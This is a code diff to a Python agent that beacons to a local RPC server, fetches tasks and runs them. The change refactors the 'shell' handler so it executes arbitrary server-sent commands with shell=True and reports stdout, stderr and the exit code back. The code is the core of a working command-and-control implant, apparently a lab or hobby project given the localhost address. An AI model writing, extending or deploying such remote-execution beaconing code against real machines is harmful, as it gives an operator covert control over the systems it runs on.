@@ -5,7 +5,6 @@ import json
 import socket
 import subprocess
 
-
 SERVER = "http://127.0.0.1:8000/rpc"
 BEACON_INTERVAL = 10
 
@@ -58,50 +57,80 @@ def identify():
 def beacon():
     return rpc("beacon")
 
-def run_shell(cmd):
-    try:
-        result = subprocess.run(
+def shell_handler(params):
+    cmd = params.get("cmd")
+    if not cmd:
+        return {
+            "stdout": "",
+            "stderr": "no command provided",
+            "exit_code": -1           
+        }
+
+    result = subprocess.run(
             cmd,
             shell=True,
             capture_output=True,
             text=True
         )
-        return result.stdout or result.stderr
-    except Exception as e:
-        return f"error: {e}"
+
+    return {
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "exit_code": result.returncode
+    }
 
 def execute_task(task):
     if not task:
         return
-
-    task_id = task.get("id", "unknown")
+    
+    task_id = task.get("id")
     method = task.get("method")
     params = task.get("params", {})
 
-    print(f"[TASK] {task_id} | {method} -> {params}")
-
     handlers = {
-        "print_message": lambda p: p.get("message"),
-        "shell": lambda p: run_shell(p.get("cmd"))
+        "shell": shell_handler,
+        "print_message": lambda p: {
+            "stdout": p.get("message", ""),
+            "stderr": "",
+            "exit_code": 0
+        }
     }
 
-    try:
-        handler = handlers.get(method)
+    handler = handlers.get(method)
 
-        if handler:
-            result = handler(params)
-        else:
-            result = "method not found"
-
-    except Exception as e:
-        result = f"execution error: {e}"
+    if not handler:
+        send_result(task_id, {
+            "status": "error",
+            "output": {
+                "stderr": "method not found",
+                "stdout": "",
+                "exit_code": -1
+            }
+        })
+        return
     
-    send_result(task_id, result)
+    try:
+        result = handler(params)
 
-def send_result(task_id, output):
+        send_result(task_id, {
+            "status": "ok",
+            "output": result
+        })
+    
+    except Exception as e:
+        send_result(task_id, {
+            "status": "error",
+            "output": {
+                "stderr": str(e),
+                "stdout": "",
+                "exit_code": -1
+            }
+        })
+
+def send_result(task_id, result):
     rpc("task_result", {
         "task_id": task_id,
-        "output": output
+        "result": result
     })
 
 def main():
